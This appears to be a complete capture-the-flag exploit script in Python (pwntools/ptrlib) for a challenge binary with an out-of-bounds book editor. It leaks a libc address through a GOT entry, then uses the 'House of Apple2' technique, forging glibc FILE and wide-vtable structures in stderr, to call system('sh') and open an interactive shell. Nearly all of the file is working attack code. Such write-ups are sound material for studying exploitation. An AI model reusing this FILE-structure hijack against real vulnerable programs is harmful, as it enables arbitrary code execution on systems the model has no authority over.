#!/usr/bin/env python
from os import wait
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def sla(delim: bytes, data: bytes):
        io.sendlineafter(delim, data)
        return

    def sa(delim: bytes, data: bytes):
        io.sendafter(delim, data)
        return

    def sl(data: bytes):
        io.sendline(data)
        return

    def s(data: bytes):
        io.send(data)
        return

    def ru(delim: bytes, drop: bool = False) -> bytes:
        return io.recvuntil(delim, drop=drop)

    def rl() -> bytes:
        return io.recvline()

    def init(length: int, contents: bytes):
        sla(b"be: ", str(length).encode())
        sla(b"book: ", contents)
        return

    def edit(offset: int, data: bytes):
        sla(b"> ", b"1")
        sla(b"edit: ", str(offset).encode())
        sl(data)
        return
        # ru(b"edit: ")
        # return int(ru(b"1. Edit", drop=True), 16)

    def read() -> bytes:
        sla(b"> ", b"2")
        ru(b"book: ")
        return ru(b"1. ", drop=True)

    def _exit():
        sl(b"3")
        return

    init(-1, b"")

    # libc leak
    book = unwrap(exe.symbol("book"))
    got_read = unwrap(exe.got("read"))

    input(">> ")
    edit(book, ptr.p64(got_read))
    libc.base = ptr.u64(read().strip(b"\n")) - unwrap(libc.symbol("read"))

    # house of apple2
    system = unwrap(libc.symbol("system"))
    stderr = unwrap(libc.symbol("_IO_2_1_stderr_"))
    wfile_jumps = unwrap(libc.symbol("_IO_wfile_jumps"))

    ## prepare fake _wide_data and _wide_vtable
    wide_data_addr = 0x000000404100
    wide_vtable_addr = wide_data_addr + 0x100

    wide_data = b""
    wide_data = wide_data.ljust(0xE0, b"\0")
    wide_data += ptr.p64(wide_vtable_addr)
    wide_data = wide_data.ljust(0x100, b"\0")

    wide_vtable = b""
    wide_vtable = wide_vtable.ljust(0x68, b"\0")
    wide_vtable += ptr.p64(system)

    ### bookの値がbookのアドレスよりも大きくなると、
    ### bookの値をbookのアドレスにするときに (stderrへの書き込み時に必要)
    ### editのoffsetに負の値を渡すことになるが、これだと何故か不具合が生じる。
    ### よって、wide_data書き込み時についでにbookの値を0にしておく。
    payload = b""
    payload += b"\0" * 8
    payload = payload.ljust(wide_data_addr - book, b"\xff")
    payload += wide_data + wide_vtable
    edit(-got_read + book, payload)

    ## prepare _IO_2_1_stderr_
    system = unwrap(libc.symbol("system"))
    stderr = unwrap(libc.symbol("_IO_2_1_stderr_"))

    file = b""
    file += b"  sh;"  # flags
    file = file.ljust(0x20, b"\0")
    file += ptr.p64(0)  # _IO_write_base
    file += ptr.p64(1)  # _IO_write_ptr
    file = file.ljust(0x58, b"\0")  #
    file += ptr.p64(system)  # _wide_vtable + 0x68 (stderr - 0x10 + 0x68)
    file = file.ljust(0x88, b"\0")
    file += ptr.p64(stderr - 0x10)  # _lock
    file = file.ljust(0xA0, b"\0")
    file += ptr.p64(stderr - 0x10)  # _wide_data
    file = file.ljust(0xC0, b"\0")
    file += ptr.p64(0)  # _mode
    file = file.ljust(0xD0, b"\0")
    file += ptr.p64(stderr - 0x10)  # _wide_data._wide_vtable (stderr - 0x10 + 0xe0)
    file += ptr.p64(wfile_jumps)  # vtable

    ### the type of the first argument that is passed to edit (offset) is int,
    ### so it is impossible to pass long addresses such as libc addresses as offset directly.
    # __libc_single_threaded_internal = unwrap(libc.symbol("__libc_single_threaded_internal"))
    edit(book, ptr.p64(stderr - 0xFFFFEEFE) + ptr.p64(0xFFFFFFFFFFFFFFFF))
    edit(0xFFFFEEFE, file)

    _exit()

    io.interactive()
    return


if __name__ == "__main__":
    main()
